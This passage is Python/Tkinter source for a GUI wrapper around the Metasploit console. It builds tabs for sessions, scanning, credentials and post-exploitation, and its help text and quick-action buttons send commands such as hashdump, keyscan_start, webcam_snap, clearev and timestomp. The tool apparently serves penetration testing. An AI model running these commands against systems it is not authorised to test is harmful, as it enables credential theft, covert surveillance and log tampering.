show options      - Show exploit options
set <option> <value> - Set an option
unset <option>    - Unset an option
run               - Run the exploit
exploit           - Run the exploit
check             - Check if target is vulnerable
""",
            "Payload": """show payloads     - List all payloads
set payload <payload> - Set payload
generate          - Generate payload
""",
            "Auxiliary": """use <auxiliary>  - Use an auxiliary module
show auxiliary    - List all auxiliary modules
run               - Run the auxiliary module
""",
            "Post": """use <post>        - Use a post-exploitation module
show post         - List all post modules
run               - Run the post module
""",
            "Session": """sessions -l       - List all sessions
sessions -i <id>  - Interact with session
sessions -k <id>  - Kill a session
sessions -u <id>  - Upgrade shell to meterpreter
sessions -s <script> - Run script on session
background        - Background current session
""",
            "Database": """db_connect        - Connect to database
db_disconnect     - Disconnect from database
db_status         - Show database status
workspace         - Manage workspaces
hosts             - List hosts
services          - List services
vulns             - List vulnerabilities
loot              - List loot
""",
            "Resource": """resource <file>  - Run resource script
makerc <file>     - Save commands to resource file
""",
            "Encoder": """show encoders     - List all encoders
use <encoder>     - Use an encoder
""",
            "NOP": """show nops          - List all NOP generators
use <nop>         - Use a NOP generator
""",
            "Evasion": """show evasion      - List all evasion modules
use <evasion>     - Use an evasion module
""",
            "Meterpreter": """sysinfo          - Show system information
getuid           - Get current user
getpid           - Get current process ID
pwd              - Print working directory
ls               - List files in current directory
cd <dir>         - Change directory
cat <file>       - Display file contents
download <file>  - Download file from remote system
upload <file>    - Upload file to remote system
rm <file>        - Delete file
mkdir <dir>      - Create directory
rmdir <dir>      - Remove directory
ps               - List running processes
kill <pid>       - Kill a process
shell            - Drop into system shell
background       - Background current session
screenshot       - Take a screenshot
webcam_snap      - Take webcam snapshot
webcam_stream    - Stream webcam
keyscan_start    - Start keylogger
keyscan_dump     - Dump captured keystrokes
keyscan_stop     - Stop keylogger
migrate <pid>    - Migrate to another process
getsystem        - Attempt to get system privileges
hashdump         - Dump password hashes
clearev          - Clear event logs
timestomp <file> - Modify file timestamps
run <script>     - Run a meterpreter script
load <extension> - Load a meterpreter extension
help             - Show meterpreter help
"""
        }
        
        commands_text += commands_dict.get(category, "No commands available for this category.")
        
        self.commands_display.delete(1.0, tk.END)
        self.commands_display.insert(1.0, commands_text)
    
    def show_full_help(self):
        """Show full help in console."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("help")
        self.console_output_callback("Showing full help...\n", "output")
    
    def show_version(self):
        """Show version in console."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("version")
        self.console_output_callback("Showing version...\n", "output")
    
    # Session manager methods
    def refresh_sessions(self):
        """Refresh session list."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.console.send_command("sessions -l")
        self.console_output_callback("Refreshing sessions...\n", "output")
    
    def interact_session(self):
        """Interact with selected session."""
        selection = self.session_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        
        item = self.session_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -i {session_id}"
        self.console.send_command(command)
        self.console_output_callback(f"Interacting with session {session_id}\n", "success")
    
    def kill_session(self):
        """Kill selected session."""
        selection = self.session_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        
        item = self.session_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -k {session_id}"
        self.console.send_command(command)
        self.console_output_callback(f"Killing session {session_id}\n", "warning")
    
    def upgrade_session(self):
        """Upgrade shell session to meterpreter."""
        selection = self.session_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a session.")
            return
        
        item = self.session_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -u {session_id}"
        self.console.send_command(command)
        self.console_output_callback(f"Upgrading session {session_id} to meterpreter\n", "success")
    
    # Meterpreter management methods
    def refresh_meterpreter_sessions(self):
        """Refresh meterpreter session list."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        # Clear existing items
        for item in self.meterpreter_tree.get_children():
            self.meterpreter_tree.delete(item)
        
        # Send command to list sessions
        self.console.send_command("sessions -l")
        self.meterpreter_output_callback("Refreshing meterpreter sessions...\n", "output")
        
        # Parse sessions output (this would need to be enhanced to parse actual output)
        # For now, we'll rely on the console output callback to show results
    
    def interact_meterpreter(self, event=None):
        """Interact with selected meterpreter session."""
        selection = self.meterpreter_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a meterpreter session.")
            return
        
        item = self.meterpreter_tree.item(selection[0])
        session_id = item['values'][0]
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = f"sessions -i {session_id}"
        self.console.send_command(command)
        self.meterpreter_output_callback(f"Interacting with meterpreter session {session_id}\n", "success")
    
    def send_meterpreter_command(self, event=None):
        """Send command to active meterpreter session."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        command = self.meterpreter_command_entry.get().strip()
        if not command:
            return
        
        self.console.send_command(command)
        self.meterpreter_output_callback(f"meterpreter > {command}\n", "output")
        self.meterpreter_command_entry.delete(0, tk.END)
    
    def quick_meterpreter_command(self, command):
        """Send quick meterpreter command."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        self.meterpreter_command_entry.delete(0, tk.END)
        self.meterpreter_command_entry.insert(0, command)
        self.send_meterpreter_command()
    
    def browse_meterpreter_local_file(self):
        """Browse for local file to upload."""
        filename = filedialog.askopenfilename(
            title="Select file to upload",
            initialdir=os.path.expanduser("~")
        )
        if filename:
            self.meterpreter_local_file.delete(0, tk.END)
            self.meterpreter_local_file.insert(0, filename)
    
    def meterpreter_upload_file(self):
        """Upload file to remote system."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        local_file = self.meterpreter_local_file.get().strip()
        remote_path = self.meterpreter_remote_path.get().strip()
        
        if not local_file:
            messagebox.showwarning("Warning", "Please specify a local file.")
            return
        
        if not os.path.exists(local_file):
            messagebox.showerror("Error", f"Local file does not exist: {local_file}")
            return
        
        if not remote_path:
            messagebox.showwarning("Warning", "Please specify a remote path.")
            return
        
        command = f"upload {local_file} {remote_path}"
        self.console.send_command(command)
        self.meterpreter_output_callback(f"Uploading {local_file} to {remote_path}...\n", "output")
    
    def meterpreter_download_file(self):
        """Download file from remote system."""
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        remote_path = self.meterpreter_remote_path.get().strip()
        local_file = self.meterpreter_local_file.get().strip()
        
        if not remote_path:
            messagebox.showwarning("Warning", "Please specify a remote file path.")
            return
        
        if not local_file:
            # Use remote filename if local not specified
            local_file = os.path.basename(remote_path)
        
        # Ask for save location if not specified
        if not local_file or not os.path.dirname(local_file):
            save_path = filedialog.asksaveasfilename(
                title="Save downloaded file as",
                initialdir=os.path.expanduser("~"),
                initialfile=os.path.basename(remote_path)
            )
            if not save_path:
                return
            local_file = save_path
        
        command = f"download {remote_path} {local_file}"
        self.console.send_command(command)
        self.meterpreter_output_callback(f"Downloading {remote_path} to {local_file}...\n", "output")
    
    def meterpreter_output_callback(self, text, tag="output"):
        """Callback for meterpreter output."""
        def _update():
            self.meterpreter_output.insert(tk.END, text, tag)
            self.meterpreter_output.see(tk.END)
        
        self.root.after(0, _update)
    
    # ==================== CUSTOM TAB SYSTEM METHODS ====================
    
    def add_tab_to_grid(self, frame, text):
        """Add a tab to the grid-based tab system."""
        # Create tab button using tk.Button for better styling control
        tab_button = tk.Button(
            self.tab_bar_frame,
            text=text,
            command=lambda: self.show_tab(text),
            width=14,  # Slightly smaller width to fit more buttons
            relief=tk.RAISED,
            borderwidth=1,
            padx=2,
            pady=2
        )
        
        # Add to grid - calculate position
        tab_index = len(self.tab_order)
        cols_per_row = 10  # Number of tabs per row (increased to fit more buttons horizontally)
        row = tab_index // cols_per_row
        col = tab_index % cols_per_row
        
        tab_button.grid(row=row, column=col, padx=1, pady=1, sticky=(tk.W, tk.E))
        
        # Store references
        self.tab_frames[text] = frame
        self.tab_buttons[text] = tab_button
        self.tab_order.append(text)
        
        # Initially hide the frame (it will be shown when selected)
        try:
            frame.pack_forget()
        except:
            pass
        
        # Configure grid columns to expand evenly
        for c in range(cols_per_row):
            self.tab_bar_frame.columnconfigure(c, weight=1, uniform="tab_cols")
        
        # Show first tab by default
        if len(self.tab_order) == 1:
            self.show_tab(text)
    
    def show_tab(self, tab_name):
        """Show the specified tab and hide others."""
        # Hide all tabs
        for name, frame in self.tab_frames.items():
            try:
                frame.pack_forget()
            except:
                try:
                    frame.grid_forget()
                except:
                    pass
        
        # Show selected tab
        if tab_name in self.tab_frames:
            frame = self.tab_frames[tab_name]
            # Ensure frame is properly packed into tab_content_frame
            frame.pack(fill=tk.BOTH, expand=True)
            # Raise frame to top to ensure it's visible
            try:
                frame.lift()
            except:
                pass
            self.current_tab = tab_name
            # Force update to ensure visibility and event handling
            self.tab_content_frame.update_idletasks()
            self.root.update_idletasks()
        
        # Update button styles - use different appearance for selected
        for name, button in self.tab_buttons.items():
            if name == tab_name:
                # Selected tab - use sunken relief and blue background
                button.config(
                    relief=tk.SUNKEN,
                    bg="#3b82f6",
                    fg="white",
                    activebackground="#4a9eff",
                    activeforeground="white",
                    state="normal"
                )
            else:
                # Unselected tab - use raised relief and default colors
                button.config(
                    relief=tk.RAISED,
                    bg="#f0f0f0",
                    fg="black",
                    activebackground="#e0e0e0",
                    activeforeground="black",
                    state="normal"
                )
    
    def index(self, tab):
        """Get index of tab (for compatibility)."""
        if isinstance(tab, str):
            if tab in self.tab_order:
                return self.tab_order.index(tab)
        elif isinstance(tab, int):
            return tab
        return 0
    
    def tab(self, index, option=None):
        """Get tab information (for compatibility)."""
        if isinstance(index, int) and 0 <= index < len(self.tab_order):
            tab_name = self.tab_order[index]
            if option == "text":
                return tab_name
        return ""
    
    def select(self, tab_index):
        """Select a tab by index."""
        if isinstance(tab_index, int) and 0 <= tab_index < len(self.tab_order):
            tab_name = self.tab_order[tab_index]
            self.show_tab(tab_name)
    
    # ==================== NEW TAB CREATION METHODS ====================
    
    def create_quick_start_wizard_tab(self):
        """Create Quick Start Wizard tab for beginners."""
        wizard_frame = ttk.Frame(self.notebook, padding="5")
        self.notebook.add(wizard_frame, text="Quick Start")
        
        # Welcome section
        welcome_frame = ttk.LabelFrame(wizard_frame, text="Welcome to YaP Metasploit GUI", padding="5")
        welcome_frame.pack(fill=tk.X, pady=(0, 5))
        
        welcome_text = """This wizard will guide you through common Metasploit tasks.
Select what you want to do below to get started."""
        ttk.Label(welcome_frame, text=welcome_text, wraplength=600).pack(anchor=tk.W)
        
        # Scenario selection
        scenario_frame = ttk.LabelFrame(wizard_frame, text="What do you want to do?", padding="5")
        scenario_frame.pack(fill=tk.BOTH, expand=True)
        
        scenarios = [
            ("Generate a Payload", "I want to create a payload to exploit a target"),
            ("Set Up a Listener", "I want to set up a handler to receive connections"),
            ("Search for Exploits", "I want to find exploits for a vulnerability"),
            ("Scan for Vulnerabilities", "I want to scan a target for vulnerabilities"),
            ("Manage Sessions", "I want to interact with active sessions"),
            ("Post-Exploitation", "I want to perform post-exploitation tasks"),
        ]
        
        self.wizard_scenario_var = tk.StringVar()
        for i, (title, desc) in enumerate(scenarios):
            rb = ttk.Radiobutton(
                scenario_frame,
                text=f"{title}: {desc}",
                variable=self.wizard_scenario_var,
                value=title
            )
            rb.pack(anchor=tk.W, pady=2)
        
        # Action buttons
        action_frame = ttk.Frame(wizard_frame)
        action_frame.pack(fill=tk.X, pady=(5, 0))
        
        start_wizard_btn = ttk.Button(
            action_frame,
            text="Start Wizard",
            command=self.run_quick_start_wizard
        )
        start_wizard_btn.pack(side=tk.LEFT, padx=(0, 5))
    
    def create_database_manager_tab(self):
        """Create Database Manager tab."""
        db_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(db_frame, text="Database Manager")
        
        # Workspace management
        workspace_frame = ttk.LabelFrame(db_frame, text="Workspace Management", padding="3")
        workspace_frame.pack(fill=tk.X, pady=(0, 5))
        
        workspace_control = ttk.Frame(workspace_frame)
        workspace_control.pack(fill=tk.X)
        
        ttk.Label(workspace_control, text="Current Workspace:").pack(side=tk.LEFT, padx=(0, 5))
        self.workspace_var = tk.StringVar(value=self.current_workspace)
        workspace_entry = ttk.Entry(workspace_control, textvariable=self.workspace_var, width=20)
        workspace_entry.pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(workspace_control, text="Switch", command=self.switch_workspace).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(workspace_control, text="Create New", command=self.create_workspace).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(workspace_control, text="List Workspaces", command=self.list_workspaces).pack(side=tk.LEFT)
        
        # Notebook for different views
        db_notebook = ttk.Notebook(db_frame)
        db_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Hosts tab
        hosts_frame = ttk.Frame(db_notebook, padding="3")
        db_notebook.add(hosts_frame, text="Hosts")
        
        hosts_control = ttk.Frame(hosts_frame)
        hosts_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(hosts_control, text="Refresh", command=self.refresh_hosts).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(hosts_control, text="Add Host", command=self.add_host_manual).pack(side=tk.LEFT)
        
        hosts_columns = ("IP", "MAC", "OS", "Status", "Services")
        self.hosts_tree = ttk.Treeview(hosts_frame, columns=hosts_columns, show="headings", height=10)
        for col in hosts_columns:
            self.hosts_tree.heading(col, text=col)
            self.hosts_tree.column(col, width=150)
        
        hosts_scroll = ttk.Scrollbar(hosts_frame, orient=tk.VERTICAL, command=self.hosts_tree.yview)
        self.hosts_tree.configure(yscrollcommand=hosts_scroll.set)
        self.hosts_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        hosts_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Services tab
        services_frame = ttk.Frame(db_notebook, padding="3")
        db_notebook.add(services_frame, text="Services")
        
        services_control = ttk.Frame(services_frame)
        services_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(services_control, text="Refresh", command=self.refresh_services).pack(side=tk.LEFT, padx=(0, 5))
        
        services_columns = ("Host", "Port", "Protocol", "Name", "State", "Info")
        self.services_tree = ttk.Treeview(services_frame, columns=services_columns, show="headings", height=10)
        for col in services_columns:
            self.services_tree.heading(col, text=col)
            self.services_tree.column(col, width=120)
        
        services_scroll = ttk.Scrollbar(services_frame, orient=tk.VERTICAL, command=self.services_tree.yview)
        self.services_tree.configure(yscrollcommand=services_scroll.set)
        self.services_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        services_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Vulnerabilities tab
        vulns_frame = ttk.Frame(db_notebook, padding="3")
        db_notebook.add(vulns_frame, text="Vulnerabilities")
        
        vulns_control = ttk.Frame(vulns_frame)
        vulns_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(vulns_control, text="Refresh", command=self.refresh_vulns).pack(side=tk.LEFT, padx=(0, 5))
        
        vulns_columns = ("Host", "Service", "Name", "Severity", "Exploit Available")
        self.vulns_tree = ttk.Treeview(vulns_frame, columns=vulns_columns, show="headings", height=10)
        for col in vulns_columns:
            self.vulns_tree.heading(col, text=col)
            self.vulns_tree.column(col, width=150)
        
        vulns_scroll = ttk.Scrollbar(vulns_frame, orient=tk.VERTICAL, command=self.vulns_tree.yview)
        self.vulns_tree.configure(yscrollcommand=vulns_scroll.set)
        self.vulns_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vulns_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Loot tab
        loot_frame = ttk.Frame(db_notebook, padding="3")
        db_notebook.add(loot_frame, text="Loot")
        
        loot_control = ttk.Frame(loot_frame)
        loot_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(loot_control, text="Refresh", command=self.refresh_loot).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(loot_control, text="Download Selected", command=self.download_loot).pack(side=tk.LEFT)
        
        loot_columns = ("Host", "Type", "Name", "Path", "Created")
        self.loot_tree = ttk.Treeview(loot_frame, columns=loot_columns, show="headings", height=10)
        for col in loot_columns:
            self.loot_tree.heading(col, text=col)
            self.loot_tree.column(col, width=150)
        
        loot_scroll = ttk.Scrollbar(loot_frame, orient=tk.VERTICAL, command=self.loot_tree.yview)
        self.loot_tree.configure(yscrollcommand=loot_scroll.set)
        self.loot_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        loot_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
    def create_post_exploitation_tab(self):
        """Create Post-Exploitation tab."""
        post_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(post_frame, text="Post-Exploitation")
        
        # Session selection
        session_frame = ttk.LabelFrame(post_frame, text="Select Session", padding="3")
        session_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(session_frame, text="Active Session:").pack(side=tk.LEFT, padx=(0, 5))
        self.post_session_var = tk.StringVar()
        post_session_combo = ttk.Combobox(session_frame, textvariable=self.post_session_var, state="readonly", width=30)
        post_session_combo.pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(session_frame, text="Refresh", command=self.refresh_post_sessions).pack(side=tk.LEFT)
        
        # Quick actions
        quick_actions_frame = ttk.LabelFrame(post_frame, text="Quick Actions", padding="3")
        quick_actions_frame.pack(fill=tk.X, pady=(0, 5))
        
        quick_actions = [
            ("Get System", "getsystem"),
            ("Dump Hashes", "hashdump"),
            ("Screenshot", "screenshot"),
            ("Webcam Snap", "webcam_snap"),
            ("Keylogger Start", "keyscan_start"),
            ("Keylogger Dump", "keyscan_dump"),
            ("Keylogger Stop", "keyscan_stop"),
            ("Clear Event Logs", "clearev"),
        ]
        
        for i, (label, cmd) in enumerate(quick_actions):
            btn = ttk.Button(
                quick_actions_frame,
                text=label,
                command=lambda c=cmd: self.run_post_action(c),
                width=18
            )
            btn.grid(row=i // 4, column=i % 4, padx=2, pady=2, sticky=(tk.W, tk.E))
        
        for col in range(4):
            quick_actions_frame.columnconfigure(col, weight=1)
        
        # Post-exploitation modules
        modules_frame = ttk.LabelFrame(post_frame, text="Post-Exploitation Modules", padding="3")
        modules_frame.pack(fill=tk.BOTH, expand=True)
        
        # Module categories
        category_frame = ttk.Frame(modules_frame)
        category_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.post_module_category = tk.StringVar(value="gather")
        categories = [
            ("Gather", "gather"),
            ("Persistence", "persistence"),
            ("Escalate", "escalate"),
            ("Exfiltrate", "exfiltrate"),
        ]
        
        for label, value in categories:
            rb = ttk.Radiobutton(
                category_frame,
                text=label,
                variable=self.post_module_category,
                value=value
            )
            rb.pack(side=tk.LEFT, padx=5)
        
        # Module list
        module_list_frame = ttk.Frame(modules_frame)
        module_list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.post_modules_tree = ttk.Treeview(module_list_frame, columns=("Module", "Description"), show="headings", height=8)
        self.post_modules_tree.heading("Module", text="Module")
        self.post_modules_tree.heading("Description", text="Description")
        self.post_modules_tree.column("Module", width=300)
        self.post_modules_tree.column("Description", width=400)
        
        module_scroll = ttk.Scrollbar(module_list_frame, orient=tk.VERTICAL, command=self.post_modules_tree.yview)
        self.post_modules_tree.configure(yscrollcommand=module_scroll.set)
        self.post_modules_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        module_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Module actions
        module_action_frame = ttk.Frame(modules_frame)
        module_action_frame.pack(fill=tk.X, pady=(5, 0))
        
        ttk.Button(module_action_frame, text="Search Modules", command=self.search_post_modules).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(module_action_frame, text="Use Module", command=self.use_post_module).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(module_action_frame, text="Show Info", command=self.show_post_module_info).pack(side=tk.LEFT)
        
        # Output
        output_frame = ttk.LabelFrame(post_frame, text="Output", padding="3")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        self.post_output = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD, font=("Consolas", 9), height=6)
        self.post_output.pack(fill=tk.BOTH, expand=True)
        self.post_output.tag_config("output", foreground="#d4d4d4")
        self.post_output.tag_config("error", foreground="#f48771")
        self.post_output.tag_config("success", foreground="#4ec9b0")
    
    def create_vulnerability_scanner_tab(self):
        """Create Vulnerability Scanner tab."""
        scan_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(scan_frame, text="Vulnerability Scanner")
        
        # Target configuration
        target_frame = ttk.LabelFrame(scan_frame, text="Scan Configuration", padding="5")
        target_frame.pack(fill=tk.X, pady=(0, 5))
        
        target_input_frame = ttk.Frame(target_frame)
        target_input_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(target_input_frame, text="Target(s):", width=15).pack(side=tk.LEFT)
        self.scan_target_entry = ttk.Entry(target_input_frame)
        self.scan_target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.scan_target_entry.insert(0, "127.0.0.1")
        
        # Quick scan buttons
        quick_scan_frame = ttk.Frame(target_frame)
        quick_scan_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(quick_scan_frame, text="Quick Port Scan", command=lambda: self.run_scan("quick")).pack(side=tk.LEFT, padx=2)
        ttk.Button(quick_scan_frame, text="Full Port Scan", command=lambda: self.run_scan("full")).pack(side=tk.LEFT, padx=2)
        ttk.Button(quick_scan_frame, text="Fast Vuln Scan", command=lambda: self.run_scan("vuln_fast")).pack(side=tk.LEFT, padx=2)
        ttk.Button(quick_scan_frame, text="Vulnerability Scan", command=lambda: self.run_scan("vuln")).pack(side=tk.LEFT, padx=2)
        ttk.Button(quick_scan_frame, text="Service Enum", command=lambda: self.run_scan("enum")).pack(side=tk.LEFT, padx=2)
        
        # Advanced options
        advanced_frame = ttk.LabelFrame(scan_frame, text="Advanced Options", padding="5")
        advanced_frame.pack(fill=tk.X, pady=(0, 5))
        
        port_frame = ttk.Frame(advanced_frame)
        port_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(port_frame, text="Port Range:", width=15).pack(side=tk.LEFT)
        self.scan_ports_entry = ttk.Entry(port_frame, width=20)
        self.scan_ports_entry.pack(side=tk.LEFT, padx=(0, 10))
        self.scan_ports_entry.insert(0, "1-1000")
        
        self.scan_intensive_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(port_frame, text="Intensive Scan", variable=self.scan_intensive_var).pack(side=tk.LEFT)
        
        # Scan status indicator
        status_frame = ttk.Frame(scan_frame)
        status_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(status_frame, text="Status:", font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=(0, 5))
        self.scan_status_label = ttk.Label(
            status_frame, 
            text="Ready", 
            foreground="gray",
            font=("Segoe UI", 9)
        )
        self.scan_status_label.pack(side=tk.LEFT, padx=(0, 10))
        
        # Progress indicator (animated dots)
        self.scan_progress_label = ttk.Label(
            status_frame,
            text="",
            font=("Segoe UI", 9)
        )
        self.scan_progress_label.pack(side=tk.LEFT)
        self.scan_progress_dots = 0
        self.scan_progress_animation_id = None
        
        # Scan results
        results_frame = ttk.LabelFrame(scan_frame, text="Scan Results", padding="3")
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        results_columns = ("Target", "Port", "Protocol", "State", "Service", "Version")
        self.scan_results_tree = ttk.Treeview(results_frame, columns=results_columns, show="headings", height=8)
        for col in results_columns:
            self.scan_results_tree.heading(col, text=col)
            self.scan_results_tree.column(col, width=120)
        
        scan_scroll = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.scan_results_tree.yview)
        self.scan_results_tree.configure(yscrollcommand=scan_scroll.set)
        self.scan_results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scan_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Action buttons
        action_frame = ttk.Frame(scan_frame)
        action_frame.pack(fill=tk.X, pady=(5, 0))
        
        ttk.Button(action_frame, text="Refresh from Database", command=self.refresh_scan_from_database).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(action_frame, text="Add to Database", command=self.add_scan_to_db).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(action_frame, text="Export Results", command=self.export_scan_results).pack(side=tk.LEFT)
    
    def create_credential_manager_tab(self):
        """Create Credential Manager tab."""
        cred_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(cred_frame, text="Credential Manager")
        
        # Credentials view
        cred_list_frame = ttk.LabelFrame(cred_frame, text="Credentials", padding="3")
        cred_list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        cred_columns = ("Service", "Username", "Password/Hash", "Type", "Source")
        self.credentials_tree = ttk.Treeview(cred_list_frame, columns=cred_columns, show="headings", height=8)
        for col in cred_columns:
            self.credentials_tree.heading(col, text=col)
            self.credentials_tree.column(col, width=150)
        
        cred_scroll = ttk.Scrollbar(cred_list_frame, orient=tk.VERTICAL, command=self.credentials_tree.yview)
        self.credentials_tree.configure(yscrollcommand=cred_scroll.set)
        self.credentials_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        cred_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Actions
        cred_action_frame = ttk.Frame(cred_frame)
        cred_action_frame.pack(fill=tk.X)
        
        ttk.Button(cred_action_frame, text="Refresh", command=self.refresh_credentials).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(cred_action_frame, text="Add Credential", command=self.add_credential_manual).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(cred_action_frame, text="Export to Hashcat", command=self.export_to_hashcat).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(cred_action_frame, text="Test Credentials", command=self.test_credentials).pack(side=tk.LEFT)
        
        # Hash cracking section
        hash_frame = ttk.LabelFrame(cred_frame, text="Hash Management", padding="3")
        hash_frame.pack(fill=tk.X, pady=(5, 0))
        
        hash_input_frame = ttk.Frame(hash_frame)
        hash_input_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(hash_input_frame, text="Hash:").pack(side=tk.LEFT, padx=(0, 5))
        self.hash_entry = ttk.Entry(hash_input_frame)
        self.hash_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        ttk.Button(hash_input_frame, text="Detect Type", command=self.detect_hash_type).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(hash_input_frame, text="Add Hash", command=self.add_hash).pack(side=tk.LEFT)
    
    def create_resource_scripts_tab(self):
        """Create Resource Scripts Manager tab."""
        script_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(script_frame, text="Resource Scripts")
        
        # Script list
        list_frame = ttk.LabelFrame(script_frame, text="Saved Scripts", padding="3")
        list_frame.pack(fill=tk.X, pady=(0, 5))
        
        script_list_columns = ("Name", "Path", "Last Modified")
        self.script_list_tree = ttk.Treeview(list_frame, columns=script_list_columns, show="headings", height=5)
        for col in script_list_columns:
            self.script_list_tree.heading(col, text=col)
            self.script_list_tree.column(col, width=200)
        
        script_list_scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.script_list_tree.yview)
        self.script_list_tree.configure(yscrollcommand=script_list_scroll.set)
        self.script_list_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        script_list_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Script editor
        editor_frame = ttk.LabelFrame(script_frame, text="Script Editor", padding="3")
        editor_frame.pack(fill=tk.BOTH, expand=True)
        
        editor_control = ttk.Frame(editor_frame)
        editor_control.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(editor_control, text="New", command=self.new_script).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(editor_control, text="Open", command=self.open_script).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(editor_control, text="Save", command=self.save_script).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(editor_control, text="Save As", command=self.save_script_as).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(editor_control, text="Run Script", command=self.run_resource_script).pack(side=tk.LEFT, padx=(0, 5))
        ttk.Button(editor_control, text="Record from Console", command=self.record_from_console).pack(side=tk.LEFT)
        
        self.script_editor = scrolledtext.ScrolledText(editor_frame, wrap=tk.NONE, font=("Consolas", 10), height=12)
        self.script_editor.pack(fill=tk.BOTH, expand=True)
        
        # Templates
        template_frame = ttk.LabelFrame(script_frame, text="Templates", padding="3")
        template_frame.pack(fill=tk.X, pady=(5, 0))
        
        templates = [
            "Basic Exploit Setup",
            "Multi-Stage Exploitation",
            "Post-Exploitation Automation",
        ]
        
        for template in templates:
            btn = ttk.Button(
                template_frame,
                text=template,
                command=lambda t=template: self.load_template(t)
            )
            btn.pack(side=tk.LEFT, padx=2)
    
    def create_network_mapper_tab(self):
        """Create Network Mapper tab."""
        map_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(map_frame, text="Network Mapper")
        
        # Control panel
        control_frame = ttk.LabelFrame(map_frame, text="Controls", padding="3")
        control_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Button(control_frame, text="Refresh Network", command=self.refresh_network_map).pack(side=tk.LEFT, padx=(0, 5))
